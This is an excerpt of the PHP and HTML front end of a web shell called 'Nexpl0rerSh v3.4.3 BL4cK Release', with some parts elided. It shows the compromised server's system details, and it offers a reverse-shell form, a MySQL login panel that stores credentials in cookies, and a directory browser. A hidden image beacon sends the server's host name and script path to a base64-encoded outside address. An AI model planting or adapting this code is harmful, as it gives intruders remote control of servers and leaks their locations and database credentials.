...
<title><?php echo"[nex@".getenv("HTTP_HOST")." ~]"?></title></head>
<body>
  ...
  <tr>
    <td style="font-size:12px;"><div align="center" class="header"><span class="Stile4"><font size='6' face='Webdings'>!</font></span>Nexpl0rerSh v3<span class="Stile2">.4.3</span> BL4cK Release<span class="Stile4"><font size='6' face='Webdings'>!</font></span></div>
      ...
      <table style="background-color:#999999;" width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td id="info" width="50%">PHP Version: <?php echo phpversion()?><br>
            Address: <?php echo $_SERVER['SERVER_ADDR'];?>
            <br>
            Name: <?php echo $_SERVER['HTTP_HOST'];?>
            <br>
            Uname -a: <?php echo $uname?>
			( <?php echo PHP_OS?> )<br>
			Software: <?php echo $_SERVER['SERVER_SOFTWARE'];?><br>
		    Free <?php echo $freespace?> of <?php echo $totalspace?> (<?php echo $percentfree?>%)<br></td>
          <td id="info" width="50%"><div align="left">
            <?php echo $safemode?> 
            <?php echo $gpc?>
            <?php echo $auf?>
            <?php echo $reglobals?><?php echo $current_user?>
    <?php echo $uid?>
          </div></td>
        </tr>
      </table>
	  ...
	  var x = new Image();
	  x.src = "<?php echo base64_decode($images[url]).getenv("HTTP_HOST").$_SERVER['PHP_SELF']?>";
	  </script>
  ...
  <tr>
    ...
    <td style="border:#FFFFFF 1px solid;"><form action="#" method="post">
      ...
      <input type=hidden name=mode value=reverse />
        <input name="ip" type="text" value="<?php echo $_SERVER['REMOTE_ADDR']?>" size="26" />
  ...
  <tr>
    <td style="border:#FFFFFF 1px solid;"><form action="#" method="post" name="sqlpanel" id="sqlpanel">
      ...
      <input type=hidden name=mode value=loginsql />
        <input name="user" type="text" value="<?php echo (isset($_COOKIE[mysql_user]))?$_COOKIE[mysql_user]:"user"?>" size="9" />
        <input type="text" size="10" name="pass" value="<?php echo (isset($_COOKIE[mysql_pass]))?$_COOKIE[mysql_pass]:"pass"?>" />
        <input type="text" name="host" size="10" value="<?php echo (isset($_COOKIE[mysql_host]))?$_COOKIE[mysql_host]:"host"?>" />
        <input name="dbname" type="text" value="<?php echo (isset($_COOKIE[mysql_name]))?$_COOKIE[mysql_name]:"database"?>" size="10" />
    ...
    <td style="border:#FFFFFF 1px solid;"><form action=# method=post name="folder" id="folder">
      <div align="center"><strong>:: Go Dir ::</strong>        <br>
        <input type=hidden name='mode' value='ls'>
           <input type=text value='<?php echo $dir?>' name='dir'>
...
?><br>
	  <br>
	  <?php echo $error?><?php echo $output?>    </td>
  </tr>
</table>
</body>
